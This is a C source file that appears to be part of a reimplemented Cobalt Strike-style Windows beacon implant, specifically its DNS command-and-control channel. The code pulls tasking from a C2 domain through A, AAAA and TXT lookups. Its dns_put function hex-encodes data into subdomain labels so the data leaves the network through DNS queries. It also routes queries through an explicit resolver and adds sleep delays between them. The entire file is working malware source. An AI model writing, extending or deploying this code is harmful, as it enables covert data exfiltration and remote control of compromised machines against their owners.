#include "channel.h"
#include "commands.h" /* safe_exit */
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include "crypto.h" /* P4.15: 不再直接依赖 tomcrypt */
#include "beacon.h"

#pragma comment( lib, "dnsapi" )

int is_winsock_initialized = 0;
unsigned short maxdns   = 255;
unsigned int   dnssleep = 0;
unsigned int   dnsidle   = 0;

char * dnsbeacon_geta;
char * dnsbeacon_getaaaa;
char * dnsbeacon_gettxt;

char * dnsresolver;

/*
 * Initialize Winsock. This only needs to happen once.
 */
void channel_winsock_init() {
	WSADATA 			wsaData;
	WORD 				wVersionRequested;

	if (is_winsock_initialized == 1)
		return;

	wVersionRequested = MAKEWORD(2, 2);

	/* try to init winsock library */
	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		//dlog("ws2_32.dll is out of date.\n");
		WSACleanup();
		safe_exit();
	}

	is_winsock_initialized = 1;

	/* dnssleep setting! */
	dnssleep = setting_int(SETTING_DNS_SLEEP);

	/* initialize this value too */
	dnsidle  = setting_int(SETTING_DNS_IDLE);

	dnsbeacon_geta = setting_ptr(SETTING_DNS_BEACON_GET_A);
	dnsbeacon_getaaaa = setting_ptr(SETTING_DNS_BEACON_GET_AAAA);
	dnsbeacon_gettxt = setting_ptr(SETTING_DNS_BEACON_GET_TXT);

	// dlog("channel_tcp.channel_winsock_init - dnsbeacon_geta:  %s\n", dnsbeacon_geta);
	// dlog("channel_tcp.channel_winsock_init - dnsbeacon_getaaaa:  %s\n", dnsbeacon_getaaaa);
	// dlog("channel_tcp.channel_winsock_init - dnsbeacon_gettxt:  %s\n", dnsbeacon_gettxt);

    // Setup DNS Direct Egress (DNSResolver)
	dnsresolver = setting_ptr(SETTING_DNSRESOLVER);

	// dlog("channel_tcp.channel_winsock_init - dnsresolver: %s\n", dnsresolver);
}

void dns_sleep() {
	if (dnssleep > 0)
		Sleep(dnssleep);
}

void set_max_dns(unsigned int signal) {
	/* TXT record channel */
	if ((signal & 0x2) == 0x2) {
		maxdns = setting_short(SETTING_MAXDNS);
	}
	/* AAAA record channel */
	else if ((signal & 0x4) == 0x4) {
		maxdns = setting_short(SETTING_MAXDNS) / 2;
	}
	/* A record channel */
	else {
		maxdns = setting_short(SETTING_MAXDNS) / 4;
	}

	/* cap maxdns at 253. Why? this is the max we can safely get away with. Really! */
	if (maxdns > 253)
		maxdns = 253;
}

unsigned int dns_get(char * domain, char * buffer, int max) {
	unsigned int size = 0;
	unsigned int read = 0;
	unsigned int data = 0;
	char c2domain[1024];
	unsigned int reqno = 0;
	unsigned int nonce = (rand() | (rand() << 16));

	_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_geta, reqno, nonce, domain);
	// dlog("channel_tcp.dns_get:  %s\n", c2domain);
	size = ntohl(channel_lookup_retry(c2domain, 100)) ^ dnsidle;
	reqno++;

	/* sanity check to make sure nothing crazy is happening */
	if (size <= 0 || size > max) {
		return 0;
	}

	while (read < size) {
		_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_geta, reqno, nonce, domain);
		// dlog("channel_tcp.dns_get 2:  %s\n", c2domain);
		data = channel_lookup_retry(c2domain, 100);
		/* the A-record channel moves 4 bytes per query - a size that is not
		 * a multiple of 4 must not let the final copy run past 'size' */
		if (size - read < 4) {
			memcpy(buffer + read, (void *)&data, size - read);
			read = size;
		}
		else {
			memcpy(buffer + read, (void *)&data, 4);
			read += 4;
		}
		reqno++;
	}

	return size;
}

unsigned int dns_get6(char * domain, char * buffer, int max) {
	unsigned int size = 0;
	unsigned int read = 0;
	char data[16];
	char c2domain[1024];
	unsigned int reqno = 0;
	unsigned int nonce = (rand() | (rand() << 16));

	_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_getaaaa, reqno, nonce, domain);
	// dlog("channel_tcp.dns_get6:  %s\n", c2domain);
	size = ntohl(channel_lookup_retry(c2domain, 100)) ^ dnsidle;
	reqno++;

	/* sanity check to make sure nothing crazy is happening */
	if (size <= 0 || size > max) {
		return 0;
	}

	while (read < size) {
		_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_getaaaa, reqno, nonce, domain);
		// dlog("channel_tcp.dns_get6 2:  %s\n", c2domain);
		channel_lookup_retry6(c2domain, 100, data);
		/* AAAA moves 16 bytes per query - same tail guard as dns_get */
		if (size - read < 16) {
			memcpy(buffer + read, data, size - read);
			read = size;
		}
		else {
			memcpy(buffer + read, data, 16);
			read += 16;
		}
		reqno++;
	}

	return size;
}

/* 档位表：字节数 -> tier 字符 + 各 label 的 dword 数。与官方手写 12 档
 * _snprintf 梯子逐字节同构（TS 按此形状解码），只是把 ~700B 的 .rdata
 * 格式串与 26 参调用收敛成一个循环。 */
static const struct {
	int          bytes;
	char         tier;
	unsigned char labels[4];
} DNS_CHUNK[12] = {
	{104, '4', {8, 9, 9, 0}},
	{ 84, '3', {7, 7, 7, 0}},
	{ 56, '2', {7, 7, 0, 0}},
	{ 48, '2', {6, 6, 0, 0}},
	{ 40, '2', {5, 5, 0, 0}},
	{ 28, '1', {7, 0, 0, 0}},
	{ 24, '1', {6, 0, 0, 0}},
	{ 20, '1', {5, 0, 0, 0}},
	{ 16, '1', {4, 0, 0, 0}},
	{ 12, '1', {3, 0, 0, 0}},
	{  8, '1', {2, 0, 0, 0}},
	{  4, '1', {1, 0, 0, 0}},
};

void dns_put(char * type, char * domain, char * buffer, int length) {
	unsigned int sent = 0;
	unsigned int data = 0;
	unsigned int dataz[26];
	char c2domain[1024];
	unsigned int reqno = 0;
	unsigned int nonce = (rand() | (rand() << 16));
	unsigned int maybe = 0;

	_snprintf(c2domain, 1024, "%s1%x.%x%x.%s", type, length, reqno, nonce, domain);
	// dlog("channel_tcp.dns_put:  %s\n", c2domain);
	channel_lookup_retry(c2domain, 100);
	reqno++;

	while (sent < length) {
		static const char hx[] = "0123456789abcdef";
		char  hex[26 * 8 + 4];
		int   t, li, n2, k, hl, shift;
		unsigned int be;

		/* 逐级降档：先按剩余长度选最大档，构建后若 >= maxdns 再降。4 字节
		   档是终极回落，与官方一致不做剩余长度检查。 */
		maybe = 0;
		for (t = 0; t < 12; t++) {
			int n = DNS_CHUNK[t].bytes;
			if (t < 11 && (sent + n) > (unsigned int)length)
				continue;
			memcpy((void *)dataz, buffer + sent, n);
			hl = 0;
			k = 0;
			for (li = 0; li < 4 && DNS_CHUNK[t].labels[li] != 0; li++) {
				if (li > 0)
					hex[hl++] = '.';
				for (n2 = 0; n2 < DNS_CHUNK[t].labels[li]; n2++, k++) {
					be = htonl(dataz[k]);
					for (shift = 28; shift >= 0; shift -= 4)
						hex[hl++] = hx[(be >> shift) & 0xf];
				}
			}
			hex[hl] = '\0';
			_snprintf(c2domain, 1024, "%s%c%s.%x%x.%s", type, DNS_CHUNK[t].tier, hex, reqno, nonce, domain);
			if (t == 11 || strlen(c2domain) < maxdns) {
				maybe = n;
				break;
			}
		}

		/* increment our sent pointer by the selected number of bytes */
		sent += maybe;

    	// dlog("channel_tcp.dns_put 2:  %s\n", c2domain);

		/* do our lookup */
		channel_lookup_retry(c2domain, 100);
		reqno++;
	}
}

/* make a lookup via an explicit resolver */
DNS_STATUS channel_lookup_explicit(char * dnsresolver, char * domain, WORD wType, PDNS_RECORD * ppDnsRecord) {
	IP4_ARRAY SrvList;

	/* use normal behavior, if no dnsresolver */
	if (strlen(dnsresolver) == 0) {
		// dlog("channel_tcp.channel_lookup - BLANK... \n");
		return DnsQuery_A(domain, wType, 0, NULL, ppDnsRecord, NULL);
	}

	/* setup the structure */
	SrvList.AddrCount = 1;
	inet_pton(AF_INET, dnsresolver, &SrvList.AddrArray[0]); // DNS server IPv4 address

	/* make our query */
	return DnsQuery_A(domain, wType, DNS_QUERY_BYPASS_CACHE, &SrvList, ppDnsRecord, NULL);
}

unsigned int channel_lookup_retry(char * domain, int retry) {
	int x;
	DNS_STATUS status;
	PDNS_RECORD pDnsRecord;

	channel_winsock_init();

	/* introduce artificial latency between requests--if the user wants this? */
	dns_sleep();

	/* try to resolve our domain a certain number of times */
	for (x = 0; x < retry; x++) {

		// dlog("channel_tcp.channel_lookup_retry - %d dnsresolver: %s domain: %s \n", retry, dnsresolver, domain);

		status = channel_lookup_explicit(dnsresolver, domain, DNS_TYPE_A, &pDnsRecord);

		if (!status) {
			/* grab the answer BEFORE freeing the record list - reading
			 * through the freed pointer "worked" only while the heap had
			 * not reused the node yet (compare channel_lookup below). */
			unsigned int answer = pDnsRecord->Data.A.IpAddress;
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
			return answer;
		}

		/* sleep for 5s if a failure happens... we'll try again at that time */
		Sleep(x + 1000);
	}

	return 0L;
}

/* 
 * This is our function for beaconing over DNS.
 */
BOOL channel_lookup(char * domain, unsigned int * result) {
	DNS_STATUS status;
	PDNS_RECORD pDnsRecord;

	/* init please */
	channel_winsock_init();

	/* introduce artificial latency between requests--if the user wants this? */
	dns_sleep();

	// dlog("channel_tcp.channel_lookup - dnsresolver: %s (%d) domain: %s \n", dnsresolver, strlen(dnsresolver), domain);

	status = channel_lookup_explicit(dnsresolver, domain, DNS_TYPE_A, &pDnsRecord);

	if (!status) {
		/* get our data */
		*result = pDnsRecord->Data.A.IpAddress;

		/* free the information */
		DnsRecordListFree(pDnsRecord, DnsFreeRecordList);

		return TRUE;
	}

	return FALSE;
}

unsigned int dns_get_txt(char * domain, char * buffer, int max) {
	char c2domain[1024];
	char encoded[1024];
	char decoded[1024];
	unsigned int read = 0;
	unsigned int reqno = 0;
	unsigned int nonce = (rand() | (rand() << 16));
	unsigned int size = 0;
	unsigned int dlen = 1024;
	unsigned int status = 0;
	unsigned int total = 0;

	/* how many bytes are we going to download? */
	_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_gettxt, reqno, nonce, domain);
    // dlog("channel_tcp.dns_get_txt:  %s\n", c2domain);
	total = ntohl(channel_lookup_retry(c2domain, 100)) ^ dnsidle;
	reqno++;

	/* sanity check to make sure nothing crazy is happening */
	if (total <= 0 || total > max) {
		return 0;
	}

	while (size < total) {
		/* create a domain with a nonce in it */
		_snprintf(c2domain, 1024, "%s%x%x.%s", dnsbeacon_gettxt, reqno, nonce, domain);
        // dlog("channel_tcp.dns_get_txt:  %s\n", c2domain);

		/* read data from some TXT records */
		read = channel_lookup_retry_txt(c2domain, 100, encoded, 1024);
		if (read <= 0)
			return -1;

		encoded[read] = '\0';

		/* base64 decode the returned data */
		status = crypto_base64_decode((const unsigned char *)encoded, read, (unsigned char *)decoded, (unsigned long*) & dlen);
		if (status != CRYPTO_OK)
			return -1;

		/* if we're ok, copy [dlen] bytes into our buffer */
		if ((size + dlen) < max) {
			memcpy(buffer + size, decoded, dlen);
			size += dlen;
		}
		else {
			return -1;
		}

		/* fscking DNS cache... increment our nonce */
		reqno++;
	}

	return size;
}

int channel_lookup_retry_txt(char * domain, int retry, char * buffer, int max) {
	DNS_STATUS status;
	PDNS_RECORD pDnsRecord;

	int x;
	int y;
	int l;
	int t = 0;

	/* more artificial latency */
	dns_sleep();

	/* try up to [retry] times to grab the DNS record */
	for (x = 0; x < retry; x++) {

		// dlog("channel_tcp.channel_lookup_retry_txt - %d dnsresolver: %s domain: %s \n", retry, dnsresolver, domain);

		status = channel_lookup_explicit(dnsresolver, domain, DNS_TYPE_TEXT, &pDnsRecord);

		if (!status) {
			/* get all of our strings please */
			for (y = 0; y < pDnsRecord->Data.TXT.dwStringCount; y++) {
				/* how long is our data? */
				l = (int)strlen(pDnsRecord->Data.TXT.pStringArray[y]);

				if ((t + l) < max) {
					/* copy our DNS data please */
					memcpy(buffer, (char *)(pDnsRecord->Data.TXT.pStringArray[y]), l);

					/* increment our buffer too, plz */
					buffer += l;
				}
				else {
					/* fail... not enough space! */
					return -2;
				}

				/* increment our total data */
				t += l;
			}

			/* free the information */
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);

			/* return the total number of characters copied to buffer */
			return t;
		}
		else {
			/* something failed... back off! */
			Sleep(x + 1000);
		}
	}

	/* we failed, call the whole thing off */
	return -1;
}

int channel_lookup_retry6(char * domain, int retry, char * buffer) {
	DNS_STATUS status;
	PDNS_RECORD pDnsRecord;

	int x;
	int t = 0;

	/* more artificial latency */
	dns_sleep();

	/* try up to [retry] times to grab the DNS record */
	for (x = 0; x < retry; x++) {

		// dlog("channel_tcp.channel_lookup_retry6 - %d dnsresolver: %s domain: %s \n", retry, dnsresolver, domain);

		status = channel_lookup_explicit(dnsresolver, domain, DNS_TYPE_AAAA, &pDnsRecord);

		if (!status) {
			/* get our data */
			memcpy(buffer, pDnsRecord->Data.AAAA.Ip6Address.IP6Byte, 16);

			/* free the information */
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);

			/* return the total number of characters copied to buffer */
			return 16;
		}
		else {
			/* something failed... back off! */
			Sleep(x + 1000);
		}
	}

	/* we failed, call the whole thing off */
	return -1;
}

u_long channel_localip() {
	SOCKET sd;
	INTERFACE_INFO InterfaceList[20];
	u_long nBytesReturned;
	u_long retVal = 0;
	int nNumInterfaces = 0;
	int i;

	channel_winsock_init();

	sd = WSASocket(AF_INET, SOCK_DGRAM, 0, 0, 0, 0);
	if (sd == INVALID_SOCKET) {
		return 0;
	}

	if (WSAIoctl(sd, SIO_GET_INTERFACE_LIST, 0, 0, &InterfaceList,
		sizeof(InterfaceList), &nBytesReturned, 0, 0) == 0) {
		nNumInterfaces = nBytesReturned / sizeof(INTERFACE_INFO);
	}

	for (i = 0; i < nNumInterfaces; ++i) {
		SOCKADDR_IN *pAddress;
		u_long nFlags;

		pAddress = (SOCKADDR_IN *)& (InterfaceList[i].iiAddress);
		nFlags = InterfaceList[i].iiFlags;
		/* find the first interface that is not a loopback and is up */
		if (!(nFlags & IFF_LOOPBACK) && nFlags & IFF_UP) {
			retVal = pAddress->sin_addr.S_un.S_addr;
			break;
		}
	}

	closesocket(sd);
	return retVal;
}